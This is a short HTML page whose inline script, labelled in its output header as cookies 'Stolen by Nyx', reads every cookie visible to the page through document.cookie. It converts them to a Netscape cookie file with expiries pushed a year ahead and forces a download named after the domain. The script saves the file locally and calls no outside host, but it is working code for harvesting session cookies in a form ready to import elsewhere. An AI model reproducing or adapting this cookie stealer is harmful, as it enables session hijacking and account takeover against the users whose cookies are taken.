<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>body{background:#000;margin:0;padding:0;}</style>
</head>
<body>
    <script>
        var domain = location.hostname;
        var cookies = document.cookie.split("; ");
        var output = "# Netscape HTTP Cookie File\n# Stolen by Nyx\n\n";
        
        cookies.forEach(function(c) {
            if(!c) return;
            var parts = c.split("=");
            var name = parts[0].trim();
            var value = parts.slice(1).join("=").trim();
            var expiry = Math.floor(Date.now() / 1000) + 31536000;
            output += domain + "\tTRUE\t/\tTRUE\t" + expiry + "\t" + name + "\t" + value + "\n";
        });
        
        var blob = new Blob([output], {type: "text/plain"});
        var a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = domain + "_cookies.txt";
        a.click();
    </script>
</body>
</html>
